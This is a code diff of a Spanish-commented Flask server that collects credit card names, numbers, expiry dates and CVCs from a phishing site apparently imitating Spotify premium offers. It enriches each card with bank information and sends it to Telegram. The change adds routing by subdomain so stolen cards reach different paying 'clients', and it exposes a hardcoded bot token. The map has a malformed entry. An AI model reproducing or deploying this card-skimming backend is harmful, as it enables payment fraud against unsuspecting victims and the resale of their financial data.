@@ -7,50 +7,94 @@ app = Flask(__name__)
 CORS(app)
 
 # --- CONFIGURACIÓN ---
+# Tu Token de Telegram
 TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'
-# Lista de personas que recibirán la información
-LISTA_DE_RECEPTORES = ['6953415010', '7707049896']
+
+# --- MAPA DE CLIENTES (EL CORAZÓN DEL NEGOCIO) ---
+# Aquí es donde gestionas a tus clientes.
+# La clave es el nombre del subdominio que usarás.
+# El valor es el ID de Telegram de la persona que debe recibir las CC de ese subdominio.
+CLIENTES_MAPA = {
+    'spotlfypremium.online': '6953415010','7707049896',  # Tu dominio principal (va a tu ID)
+    'cliente1.spotlfypremium.online': '7707049896', # Subdominio 1 (va a tu socio)
+    'promo.spotlfypremium.online': '123456789',     # Subdominio 2 (va a un grupo)
+    'juan.spotlfypremium.online': '987654321',      # Subdominio 3 (va a otro cliente)
+}
+
+def get_bank_info_pro(card_number):
+    """Consulta de banco con protección contra bloqueos."""
+    bin_number = card_number[:6]
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+    }
+    try:
+        print(f"🔍 Buscando banco para BIN: {bin_number}")
+        res = requests.get(f"https://lookup.binlist.net/{bin_number}", headers=headers, timeout=4)
+        if res.status_code == 200:
+            data = res.json()
+            bank = data.get('bank', {}).get('name', 'Desconocido')
+            type_card = data.get('type', 'DESCONOCIDO').upper()
+            country = data.get('country', {}).get('name', 'Desconocido')
+            return f"{bank} | {type_card} | {country}"
+        return "🏦 Banco: Desconocido"
+    except:
+        return "🏦 Error de conexión"
 
 @app.route('/enviar-datos', methods=['POST'])
 def recibir_datos():
     data = request.json
-    target_id = str(data.get('target_id'))
+    
+    # 1. DETECCIÓN AUTOMÁTICA DE SUBDOMINIO
+    # El servidor lee la cabecera 'Host' para saber de qué web viene la petición
+    host_actual = request.host.split(':')[0] 
+    print(f"🌐 Petición recibida desde el dominio: {host_actual}")
 
-    # 1. Validación de seguridad (Solo si el ID está en tu lista)
-    if target_id not in LISTA_DE_RECEPTORES:
+    # 2. BUSCAR AL DUEÑO EN EL MAPA
+    id_destinatario = CLIENTES_MAPA.get(host_actual)
+
+    # Si el subdominio no está en tu lista, se ignora por seguridad
+    if not id_destinatario:
+        print(f"🚫 Subdominio no autorizado: {host_actual}")
         return jsonify({"status": "ignored"}), 200
 
-    # 2. Captura de datos directos
+    # 3. CAPTURA DE DATOS
     nombre = data.get('nombre', 'N/A')
     tarjeta = data.get('tarjeta', 'N/A')
     expiracion = data.get('expiracion', 'N/A')
     cvc = data.get('cvc', 'N/A')
 
-    # 3. Construcción del mensaje (Sin buscar banco, directo al grano)
+    # 4. CONSULTA DE BANCO
+    info_banco = get_bank_info_pro(tarjeta)
+
+    # 5. CONSTRUCCIÓN DEL MENSAJE
     mensaje = (
-        "💰 *NUEVA CC CAPTURADA* 💰\n"
-        "━━━━━━━━━━━━━━━━━━\n"
+        f"💰 *NUEVA CC CAPTURADA* 💰\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"🌐 *ORIGEN:* `{host_actual}`\n"
         f"👤 *Nombre:* `{nombre}`\n"
         f"💳 *Tarjeta:* `{tarjeta}`\n"
         f"📅 *Exp:* `{expiracion}`\n"
         f"🔐 *CVC:* `{cvc}`\n"
-        "━━━━━━━━━━━━━━━━━━"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"🏦 *INFO:* `{info_banco}`\n"
+        f"━━━━━━━━━━━━━━━━━━"
     )
 
-    # 4. Envío masivo a tus IDs
-    exitos = 0
-    for receptor in LISTA_DE_RECEPTORES:
-        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {"chat_id": receptor, "text": mensaje, "parse_mode": "Markdown"}
-        try:
-            res = requests.post(url_telegram, json=payload, timeout=5)
-            if res.status_code == 200:
-                exitos += 1
-        except:
-            continue
-
-    print(f"✅ Proceso completado. Enviados a {exitos} personas.")
-    return jsonify({"status": "success", "enviados": exitos}), 200
+    # 6. ENVÍO AL DESTINATARIO ASIGNADO
+    url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": id_destinatario, "text": mensaje, "parse_mode": "Markdown"}
+    
+    try:
+        res = requests.post(url_telegram, json=payload, timeout=5)
+        if res.status_code == 200:
+            print(f"✅ CC enviada con éxito al cliente de: {host_actual}")
+            return jsonify({"status": "success"}), 200
+        else:
+            print(f"❌ Error de Telegram: {res.text}")
+            return jsonify({"status": "error"}), 500
+    except Exception as e:
+        print(f"❌ Error de red: {e}")
+        return jsonify({"status": "error"}), 500
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
